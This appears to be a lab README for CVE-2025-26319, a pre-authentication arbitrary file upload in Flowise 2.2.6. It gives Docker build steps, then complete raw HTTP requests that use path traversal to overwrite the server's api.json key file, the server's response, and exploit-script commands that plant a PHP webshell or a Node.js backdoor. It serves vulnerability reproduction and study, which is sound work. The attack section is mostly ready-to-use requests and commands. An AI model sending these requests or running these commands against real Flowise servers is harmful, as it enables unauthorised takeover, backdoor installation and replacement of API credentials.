#  CVE-2025-26319 
FlowiseAI Flowise v2.2.6 was discovered to contain an arbitrary file upload vulnerability in `/api/v1/attachments`.

## Metrics
CVSSv2: N\A 
CVSSv3: 9.8 CRITICAL 

## Notes
This Docker image build and the original build have different paths. Keep that in mind.

## Vulnerability Environment
### Run VulnForge build
Build and run:
```bash
docker compose build
docker compose up -d
```
Stop Environment and remove network:
```bash
docker compose down
```

### Original image
#### Build original image
```shell
git clone https://github.com/FlowiseAI/Flowise.git
cd Flowise ; cd docker      
sed -i 's/RUN npm install -g flowise/RUN npm install -g flowise@2.2.6/' Dockerfile     
docker build --no-cache -t flowise .
docker run -d --name flowise -p 3000:3000 flowise
```
```shell
# Stop image
docker stop flowise
```

## Detection and exploitation example
1. Run Environment
Open http://localhost:3000 or http://your_ip:3000 and login vulnforge/vulnforge (not accepteble for original image).

### Manualy
#### Request
Request if flowise installed as node module (like in this image):

```http
POST /api/v1/attachments/..%2f..%2f..%2f..%2f..%2fusr%2flocal%2flib%2fnode_modules/flowise HTTP/1.1
Host: 192.168.93.63:3000
Content-Length: 547
Content-Type: multipart/form-data ; boundary=----WebKitFormBoundaryEXu6ASxTCbiyFYrx

------WebKitFormBoundaryEXu6ASxTCbiyFYrx
Content-Disposition: form-data; name="files"; filename="api.json"
Content-Type: text/plain

[
    {
        "keyName": "VunlForgeKey",
        "apiKey": "ByzotchjMI6lnduyKXXuvnm04Wg_11111",
        "apiSecret": "2811c408475543a7b3448b1e8b1f02ff99a4f0dc9489983a3cd5e16f9679ac736450b8c5eca5de8c59ce739a6b4a43cbb30ce9343339e62ea40ff890607b2d7d.b011c5b1163186d2",
        "createdAt": "04-Apr-25",
        "id": "71406cde62d4e6ef384a2caebc1086fc"
    }
]
------WebKitFormBoundaryEXu6ASxTCbiyFYrx--
```

Request for default installation:
```http
POST /api/v1/attachments/..%2f..%2f..%2f..%2f..%2froot%2f/.flowise HTTP/1.1
Host: 192.168.93.63:3000
Content-Length: 530
Content-Type: multipart/form-data ; boundary=----WebKitFormBoundaryEXu6ASxTCbiyFYrx

------WebKitFormBoundaryEXu6ASxTCbiyFYrx
Content-Disposition: form-data; name="files"; filename="api.json"
Content-Type: text/plain

[
    {
        "keyName": "VunlForgeKey",
        "apiKey": "AyzotchjMI6lnduyKXXuvnm04Wg_11111",
        "apiSecret": "2811c408475543a7b3448b1e8b1f02ff99a4f0dc9489983a3cd5e16f9679ac736450b8c5eca5de8c59ce739a6b4a43cbb30ce9343339e62ea40ff890607b2d7d.b011c5b1163186d2",
        "createdAt": "04-Apr-25",
        "id": "71406cde62d4e6ef384a2caebc1086fc"
    }
]
------WebKitFormBoundaryEXu6ASxTCbiyFYrx--
```

P.S: If you check on other “in the wild” installations, check the path in the POST header. They are different.

#### Response
The answer is the same. So will be the `HTTP/1.1 200 OK` response if the file is just written to an arbitrary location, but does not overwrite `api.json`.
```http
HTTP/1.1 200 OK
Vary: Origin
Content-Type: application/json; charset=utf-8
Content-Length: 308
ETag: W/"134-QNfC8lr7aR9w8d2np0Y5RTFBYmw"
Date: Fri, 04 Apr 2025 15:02:08 GMT
Connection: keep-alive
Keep-Alive: timeout=5

[{
    "name": "api.json",
    "mimeType": "text/plain",
    "size": 366,
    "content": "VunlForgeKey\nByzotchjMI6lnduyKXXuvnm04Wg_11111\n2811c408475543a7b3448b1e8b1f02ff99a4f0dc9489983a3cd5e16f9679ac736450b8c5eca5de8c59ce739a6b4a43cbb30ce9343339e62ea40ff890607b2d7d.b011c5b1163186d2\n04-Apr-25\n71406cde62d4e6ef384a2caebc1086fc"
}]
```

### Exploit
Exploit originaly made [by YuoLuo](https://github.com/YuoLuo/CVE-2025-26319). This is for example, it doesn't work in this build (unless rewrite the exploit). But you can use original image.

#### Basic file upload 
```shell
python3 CVE-2025-26319.py -u http://target:3000 -f local_file.txt -d /path/on/server/file.txt 
```
Upload configuration file

#### Modify API key configuration
```shell
python3 CVE-2025-26319.py -u http://target:3000 -f new_api.json -d /root/.flowise/api.json
```

Automatically generate and upload Webshell

#### Upload PHP Webshell
```shell
python3 CVE-2025-26319.py -u http://target:3000 --generate-webshell php --webshell-path /var/www/html/shell.php
```

#### Uploading a Node.js backdoor
```shell
python3 CVE-2025-26319.py -u http://target:3000 --generate-webshell nodejs --webshell-path /tmp/backdoor.js
```


## Exploits and PoCs
[https://github.com/YuoLuo/CVE-2025-26319](https://github.com/YuoLuo/CVE-2025-26319)

## Nuclei Template

## CTF Rooms

## References
[NIST: CVE-2025-26319](https://nvd.nist.gov/vuln/detail/CVE-2025-26319)   
[Medium: The Burn Notice, Part 2.5/5 | Flowise Pre-Auth Arbitrary File Upload (CVE-2025–26319)](https://medium.com/@attias.dor/the-burn-notice-part-2-5-5-flowise-pre-auth-arbitrary-file-upload-cve-2025-26319-0d4194a34183)  
[Github: Flowise 2.2.6](https://github.com/FlowiseAI/Flowise/releases/tag/flowise%402.2.6)  